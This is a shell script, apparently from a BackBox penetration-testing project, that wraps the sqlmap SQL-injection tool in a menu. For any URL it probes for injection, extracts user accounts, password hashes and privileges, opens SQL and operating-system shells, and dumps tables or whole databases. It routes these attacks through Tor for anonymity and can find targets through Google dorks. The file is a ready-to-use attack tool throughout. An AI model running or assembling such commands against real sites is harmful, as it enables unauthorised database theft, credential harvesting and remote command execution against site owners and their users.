#!/bin/sh
	clear
	ver="0.9.9"
	printf "**		Automated sqlmap (asqlmap) for BackBox v. $ver 	  **\n"
	printf "   		           developed by Gualty    \n"
	printf "   		         http://github.com/Gualty    \n"
	printf "\n\nEach operation will be performed using the --tor flag for your anonymity"
	printf "\n		** Check that TOR and Polipo are running **\n"

	#Check if sqlmap is installed on the system
	sqlmapexist=$(which sqlmap)
	if [ -z "$sqlmapexist" ]; then
		echo "ERROR: sqlmap is not installed!\n\n Install it before run sqlmap"
		exit 0
	fi

	#Variables from the command line
	l="1"
	r="1"
	t="1"
	#If 2° element is -r
	if [ "$2" = "-r" ]; then
		r=$3
	fi

	#If 4° element is -r
	if [ "$4" = "-r" ]; then
		r=$5
	fi

	#If 6° element is -r
	if [ "$6" = "-r" ]; then
		r=$7
	fi

	#If 2° element is -l
	if [ "$2" = "-l" ]; then
		l=$3
	fi

	#If 4° element is -l
	if [ "$4" = "-l" ]; then
		l=$5
	fi

	#If 6° element is -l
	if [ "$6" = "-l" ]; then
		l=$7
	fi

	#If 2° element is -t
	if [ "$2" = "-t" ]; then
		t=$3
	fi

	#If 4° element is -t
	if [ "$4" = "-t" ]; then
		t=$5
	fi

	#If 6° element is -t
	if [ "$6" = "-t" ]; then
		t=$7
	fi

	#Google Dork
	case $1 in
	-g) echo "\nATTENTION: Google Dork search will not use Tor, so you will not be anonymous.\nPress ENTER to continue at your own risk or CTRL+C to close asqlmap\n";read tasto;sqlmap -g $2 --random-agent -b --dbs --table --eta --cleanup  --identify-waf;echo "Google Dork search done\n\nPress any key to close asqlmap";read tasto;exit;;
	esac
	#Check if the user specified an URL if is not a Google Dork search
	if [ -z "$1" ]
	then
		printf "\nNo URL specified. \nEg. ./asqlmap.sh http://www.example.com/index.php?id= \n\nPress any key to close asqlmap\n";read tasto;exit;
	fi
	if [ "$1" = "-h" ] || [ "$1" = "-help" ]; then
		echo "USAGE:\n\t./asqlmap.sh \"URL\" [OPTIONS]\nOptions after URL:\n\t-r <risk value>\t\tRisk of test to perform (1-3, default 1)\n\t-l <level value>\tLevel of test to perform (1-5, default 1)\n\t-t <# of threads>\tNumber of threads (1-10, default 1)\nOptions without URL:\n\t-g <google dork>\tSearch for Google Dorks\n\t-purge-output\t\tSecurely erase the sqlmap output directory\n\t-h,-help\t\tShow this help\n\t-v\t\t\tShow the version of asqlmap"
		exit 0
	fi
	if [ "$1" = "-v" ]; then
		echo "\nasqlmap v. $ver\n"
		exit 0
	fi
	if [ "$1" = "-purge-output" ]; then
		printf "\nATTENTION: this operation will be irreversible.\nIf an error of sqlmap appear, update sqlmap.\nPress ENTER to continue or CTRL+C to abort.\n";read tasto;sqlmap --purge-output;printf "sqlmap output folder was securely purged\n\nPress any key to continue";read tasto;
		exit 0
	fi
	# The options menu
	printf "\nURL: "; echo $1
	printf "\nWhat do you want to do?\n\n"

	printf "1) Vulnerability check and information research (Databases,tables)\n"
	printf "2) Users, passwords and privileges research\n"
	printf "3) Open SQL Shell\n"
	printf "4) Open OS Shell\n"
	printf "5) Dump single table\n"
	printf "6) Dump single database\n"
	printf "7) Dump all databases\n"
	printf "============================================================================\n"
	printf "8) Update this tool\n"
	printf "9) Update sqlmap\n"
	printf "0) Quit\n"
	printf "Choise: "
	read choice
	# Execute the right operation based on the choice of the user
	case "$choice" in
		1) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dbs --table --tor --eta --cleanup --identify-waf --exclude-sysdbs;echo "Vulnerability check done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		2) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --users --passwords --privileges --tor  --eta --cleanup  --identify-waf --exclude-sysdbs;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		3) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --sql-shell --tor --eta --cleanup --identify-waf --exclude-sysdbs;echo "\nSQL Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		4) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --os-shell --tor --eta --cleanup --identify-waf --exclude-sysdbs;echo "\nOS Shell closed\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dump -T $tabella --tor --eta --cleanup --identify-waf --exclude-sysdbs;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read tasto;$0 $1 $2 $3 $4 $5;;
		6) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dump -D $database --tor --eta --cleanup --identify-waf --exclude-sysdbs;echo "\nDump of the database '$database' done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		7) sqlmap -u $1 --random-agent  --level=$l --risk=$r --threads=$t -b --dump-all --tor --eta --cleanup --identify-waf --exclude-sysdbs;echo "\nDump of all databases done\n\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		8) git pull; echo "\nasqlmap updated\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		9) sudo sqlmap --update; echo "\nsqlmap updated\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
		0) echo "\nBye bye =)\n"; exit 0;;
		q) echo "\nBye bye =)\n"; exit 0;;
		quit) echo "\nBye bye =)\n"; exit 0;;
		*) echo "\nNot valid command\nPress any key to continue";read tasto;$0 $1 $2 $3 $4 $5;;
	esac
